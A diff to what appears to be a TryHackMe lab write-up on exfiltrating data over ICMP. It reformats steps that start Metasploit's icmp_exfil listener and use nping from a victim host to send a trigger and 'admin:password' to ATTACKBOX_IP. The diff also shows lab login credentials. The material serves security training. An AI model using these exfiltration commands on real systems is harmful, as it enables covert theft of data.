@@ -82,22 +82,26 @@ msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
 BPF_FILTER => icmp and not src ATTACKBOX_IP
 ```
 
-We also need to select which network interface to listen to, **`<red>eth0</red>`**. Finally, <red>executes</red> run to start the module.
+We also need to select which network interface to listen to, **`eth0`**. Finally, <red>executes</red> run to start the module.
 
-Set the interface in MSF
+```bash
+#Set the interface in MSF
 msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
 INTERFACE => eth0
 msf5 auxiliary(server/icmp_exfil) > run
     
 [*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
 [*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
-We prepared icmp.thm.com as a victim machine to complete the ICMP task with the required tools. From the JumpBox, log in to the icmp.thm.com using thm:tryhackme credentials.
+```
+  
+We prepared `icmp.thm.com` as a victim machine to complete the ICMP task with the required tools. From the JumpBox, log in to the `icmp.thm.com` using `thm:tryhackme` credentials.
 
-We have preinstalled the nping tool, an open-source tool for network packet generation, response analysis, and response time measurement. The NPING tool is part of the NMAP suite tools.
+We have preinstalled the **`nping`** tool, an open-source tool for network packet generation, response analysis, and response time measurement. The NPING tool is part of the NMAP suite tools. [Link here](https://nmap.org/nping/) or visit: https://nmap.org/nping/
 
-First, we will send the BOF trigger from the ICMP machine so that the Metasploit framework starts writing to the disk. 
+First, we will send the **`BOF trigger`** from the ICMP machine so that the Metasploit framework starts writing to the disk. 
 
-Sending the Trigger Value from the Victim
+```bash
+                          #Sending the Trigger Value from the Victim
 thm@jump-box$ ssh thm@icmp.thm.com
 thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
     
@@ -109,13 +113,16 @@ RCVD (0.0755s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=
 Max rtt: 38.577ms | Min rtt: 0.636ms | Avg rtt: 19.606ms
 Raw packets sent: 1 (39B) | Rcvd: 2 (71B) | Lost: 0 (0.00%)
 Nping done: 1 IP address pinged in 1.06 seconds
-We sent one ICMP packet using the nping command with --data-string argument. We specify the trigger value with the file name BOFfile.txt, set by default in the Metasploit framework. This could be changed from Metasploit if needed!
+```
+
+We sent one ICMP packet using the **`nping`*** command with **`--data-string`** argument. We specify the trigger value with the file name **`BOFfile.txt`**, set by default in the Metasploit framework. This could be changed from Metasploit if needed!
 
 Now check the AttackBox terminal. If everything is set correctly, the Metasploit framework should identify the trigger value and wait for the data to be written to disk. 
 
 Let's start sending the required data and the end of the file trigger value from the ICMP machine.
 
-Sending the Data and the End of the File Trigger Value
+```bash
+                        #Sending the Data and the End of the File Trigger Value
 thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
     
 Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
@@ -149,6 +156,7 @@ Max rtt: 339.555ms | Min rtt: 0.391ms | Avg rtt: 169.973ms
 Raw packets sent: 1 (31B) | Rcvd: 2 (67B) | Lost: 0 (0.00%)
 Nping done: 1 IP address pinged in 1.07 seconds
 thm@icmp-host:~#
+```
 Let's check our AttackBox once we have done sending the data and the ending trigger value.
 
 Receiving Data in MSF
